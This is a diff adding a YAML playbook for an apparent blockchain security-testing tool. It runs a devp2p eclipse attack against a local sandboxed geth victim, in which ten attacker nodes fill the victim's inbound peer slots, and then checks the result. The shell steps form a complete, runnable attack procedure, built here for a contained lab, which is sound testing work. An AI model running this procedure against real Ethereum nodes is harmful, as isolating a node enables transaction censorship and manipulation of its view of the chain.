@@ -1,0 +1,314 @@
+# L1 devp2p eclipse attack: EXECUTION, not just topology heuristics.
+#
+# Boots one victim geth node (private PoS-style chain, RPC 8546, p2p
+# 30304, --maxpeers 12, discovery off) and ten attacker geth instances
+# sharing the victim's genesis (corpus/fixtures/p2p-eclipse/genesis.json,
+# installed into every datadir with `geth init`). Every attacker dials
+# the victim via admin.addPeer, filling all of the victim's inbound
+# peer slots (geth reserves maxpeers/3 = 4 slots for outbound dials,
+# so 8 of the 12 are fillable by inbound attackers) — all from
+# 127.0.0.1. The `p2p-eclipse` builtin then reads the victim's
+# admin_peers and confirms the eclipse state (BTV-L1-002).
+#
+# Geth is resolved via $GETH_BIN (default: ~/.local/bin/geth); a recent
+# stable linux-amd64 build from https://gethstore.blob.core.windows.net/builds/
+# works. Note geth >= 1.14 requires a TTD-bearing (PoS-style) genesis;
+# clique/ethash private chains are no longer accepted.
+#
+# Run from the repo root:
+#   bin/blocktack campaign \
+#     --target corpus/fixtures/p2p-eclipse/target.yaml \
+#     --playbook playbooks/evm/p2p-eclipse.yaml
+apiVersion: blocktack/v1
+kind: Playbook
+name: p2p-eclipse
+description: >
+  Executes a devp2p eclipse attack against a sandboxed victim node:
+  ten attacker-controlled geth instances share the victim's genesis and
+  dial it directly, filling every inbound peer slot (maxpeers 12 → 8
+  inbound slots). The p2p-eclipse builtin then verifies that the
+  victim's entire peer set is attacker-controlled, which enables tx
+  censorship, information cleansing, and view replacement (BTV-L1-002).
+target:
+  chainTypes: [evm]
+  layers: [L1]
+steps:
+  - id: geth-preflight
+    name: Verify geth and init victim + 10 attacker datadirs with the shared genesis
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          GETH_BIN="${GETH_BIN:-$HOME/.local/bin/geth}"
+          if ! command -v "$GETH_BIN" >/dev/null 2>&1; then
+            echo "geth not found at $GETH_BIN — install one from" \
+              "https://gethstore.blob.core.windows.net/builds/ or set GETH_BIN" >&2
+            exit 1
+          fi
+          "$GETH_BIN" version | head -3
+          GENESIS="${BLOCKTACK_ROOT:-.}/corpus/fixtures/p2p-eclipse/genesis.json"
+          DD="$BLOCKTACK_OUT_DIR/eclipse"
+          rm -rf "$DD"
+          mkdir -p "$DD"
+          for n in victim attacker-0 attacker-1 attacker-2 attacker-3 attacker-4 \
+                   attacker-5 attacker-6 attacker-7 attacker-8 attacker-9; do
+            "$GETH_BIN" init --datadir "$DD/$n" "$GENESIS" >/dev/null ||
+              { echo "geth init failed for $n" >&2; exit 1; }
+          done
+          echo "initialized 11 datadirs with shared genesis $GENESIS"
+
+  - id: victim-up
+    name: Start the victim geth node (RPC 8546, p2p 30304, maxpeers 12, no discovery)
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          GETH_BIN="${GETH_BIN:-$HOME/.local/bin/geth}"
+          DD="$BLOCKTACK_OUT_DIR/eclipse"
+          # maxpeers 12: geth reserves maxpeers/3 slots for outbound
+          # dials, leaving 8 inbound slots for the attacker swarm.
+          exec "$GETH_BIN" \
+            --datadir "$DD/victim" \
+            --networkid 31338 \
+            --port 30304 \
+            --nat none \
+            --nodiscover \
+            --maxpeers 12 \
+            --http --http.addr 127.0.0.1 --http.port 8546 \
+            --http.api eth,net,web3,admin \
+            --authrpc.port 8651 \
+            --verbosity 2
+      background: true
+
+  - id: attacker-0-up
+    name: Start attacker node 0 (p2p 30314)
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          GETH_BIN="${GETH_BIN:-$HOME/.local/bin/geth}"
+          exec "$GETH_BIN" --datadir "$BLOCKTACK_OUT_DIR/eclipse/attacker-0" \
+            --networkid 31338 --port 30314 --nat none --nodiscover \
+            --maxpeers 2 --authrpc.port 8652 --verbosity 2
+      background: true
+
+  - id: attacker-1-up
+    name: Start attacker node 1 (p2p 30315)
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          GETH_BIN="${GETH_BIN:-$HOME/.local/bin/geth}"
+          exec "$GETH_BIN" --datadir "$BLOCKTACK_OUT_DIR/eclipse/attacker-1" \
+            --networkid 31338 --port 30315 --nat none --nodiscover \
+            --maxpeers 2 --authrpc.port 8653 --verbosity 2
+      background: true
+
+  - id: attacker-2-up
+    name: Start attacker node 2 (p2p 30316)
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          GETH_BIN="${GETH_BIN:-$HOME/.local/bin/geth}"
+          exec "$GETH_BIN" --datadir "$BLOCKTACK_OUT_DIR/eclipse/attacker-2" \
+            --networkid 31338 --port 30316 --nat none --nodiscover \
+            --maxpeers 2 --authrpc.port 8654 --verbosity 2
+      background: true
+
+  - id: attacker-3-up
+    name: Start attacker node 3 (p2p 30317)
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          GETH_BIN="${GETH_BIN:-$HOME/.local/bin/geth}"
+          exec "$GETH_BIN" --datadir "$BLOCKTACK_OUT_DIR/eclipse/attacker-3" \
+            --networkid 31338 --port 30317 --nat none --nodiscover \
+            --maxpeers 2 --authrpc.port 8655 --verbosity 2
+      background: true
+
+  - id: attacker-4-up
+    name: Start attacker node 4 (p2p 30318)
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          GETH_BIN="${GETH_BIN:-$HOME/.local/bin/geth}"
+          exec "$GETH_BIN" --datadir "$BLOCKTACK_OUT_DIR/eclipse/attacker-4" \
+            --networkid 31338 --port 30318 --nat none --nodiscover \
+            --maxpeers 2 --authrpc.port 8656 --verbosity 2
+      background: true
+
+  - id: attacker-5-up
+    name: Start attacker node 5 (p2p 30319)
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          GETH_BIN="${GETH_BIN:-$HOME/.local/bin/geth}"
+          exec "$GETH_BIN" --datadir "$BLOCKTACK_OUT_DIR/eclipse/attacker-5" \
+            --networkid 31338 --port 30319 --nat none --nodiscover \
+            --maxpeers 2 --authrpc.port 8657 --verbosity 2
+      background: true
+
+  - id: attacker-6-up
+    name: Start attacker node 6 (p2p 30320)
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          GETH_BIN="${GETH_BIN:-$HOME/.local/bin/geth}"
+          exec "$GETH_BIN" --datadir "$BLOCKTACK_OUT_DIR/eclipse/attacker-6" \
+            --networkid 31338 --port 30320 --nat none --nodiscover \
+            --maxpeers 2 --authrpc.port 8658 --verbosity 2
+      background: true
+
+  - id: attacker-7-up
+    name: Start attacker node 7 (p2p 30321)
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          GETH_BIN="${GETH_BIN:-$HOME/.local/bin/geth}"
+          exec "$GETH_BIN" --datadir "$BLOCKTACK_OUT_DIR/eclipse/attacker-7" \
+            --networkid 31338 --port 30321 --nat none --nodiscover \
+            --maxpeers 2 --authrpc.port 8659 --verbosity 2
+      background: true
+
+  - id: attacker-8-up
+    name: Start attacker node 8 (p2p 30322)
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          GETH_BIN="${GETH_BIN:-$HOME/.local/bin/geth}"
+          exec "$GETH_BIN" --datadir "$BLOCKTACK_OUT_DIR/eclipse/attacker-8" \
+            --networkid 31338 --port 30322 --nat none --nodiscover \
+            --maxpeers 2 --authrpc.port 8660 --verbosity 2
+      background: true
+
+  - id: attacker-9-up
+    name: Start attacker node 9 (p2p 30323)
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          GETH_BIN="${GETH_BIN:-$HOME/.local/bin/geth}"
+          exec "$GETH_BIN" --datadir "$BLOCKTACK_OUT_DIR/eclipse/attacker-9" \
+            --networkid 31338 --port 30323 --nat none --nodiscover \
+            --maxpeers 2 --authrpc.port 8661 --verbosity 2
+      background: true
+
+  - id: wait-for-victim-rpc
+    name: Wait for the victim RPC endpoint to accept requests
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          GETH_BIN="${GETH_BIN:-$HOME/.local/bin/geth}"
+          for i in $(seq 1 60); do
+            "$GETH_BIN" attach --exec admin.nodeInfo.enode http://127.0.0.1:8546 >/dev/null 2>&1 && exit 0
+            sleep 0.5
+          done
+          echo "victim geth RPC did not come up on 8546" >&2
+          exit 1
+
+  - id: eclipse-dial
+    name: Dial all 10 attackers into the victim (admin.addPeer of the victim enode)
+    tactic: exploit
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          GETH_BIN="${GETH_BIN:-$HOME/.local/bin/geth}"
+          DD="$BLOCKTACK_OUT_DIR/eclipse"
+          ENODE=$("$GETH_BIN" attach --exec admin.nodeInfo.enode http://127.0.0.1:8546 | tr -d '"')
+          [ -n "$ENODE" ] || { echo "could not read victim enode" >&2; exit 1; }
+          # Wait for every attacker's IPC socket before dialing
+          for i in $(seq 1 60); do
+            missing=0
+            for a in 0 1 2 3 4 5 6 7 8 9; do
+              [ -S "$DD/attacker-$a/geth.ipc" ] || missing=1
+            done
+            [ "$missing" = 0 ] && break
+            sleep 0.5
+          done
+          for a in 0 1 2 3 4 5 6 7 8 9; do
+            "$GETH_BIN" attach --exec "admin.addPeer('$ENODE')" "$DD/attacker-$a/geth.ipc" >/dev/null ||
+              echo "warning: addPeer from attacker-$a failed" >&2
+          done
+          echo "10 attacker nodes dialed into victim: $ENODE"
+
+  - id: wait-for-eclipse
+    name: Wait for the victim's inbound peer slots to fill (8 of 8 from 127.0.0.1)
+    tactic: exploit
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          GETH_BIN="${GETH_BIN:-$HOME/.local/bin/geth}"
+          for i in $(seq 1 120); do
+            N=$("$GETH_BIN" attach --exec 'admin.peers.length' http://127.0.0.1:8546 2>/dev/null)
+            if [ -n "$N" ] && [ "$N" -ge 8 ]; then
+              echo "victim peer slots filled: $N/8"
+              exit 0
+            fi
+            sleep 0.5
+          done
+          echo "victim peer slots did not fill in 60s (last count: ${N:-none})" >&2
+          exit 1
+
+  - id: p2p-eclipse
+    name: Verify the eclipse state via admin_peers (all slots one IP?)
+    tactic: verify
+    run:
+      type: builtin
+      action: p2p-eclipse
+
+verification:
+  - id: eclipse-executed
+    expects: p2p-eclipse reports a critical/confirmed finding — all 8 victim inbound peer slots held by 127.0.0.1 (BTV-L1-002)
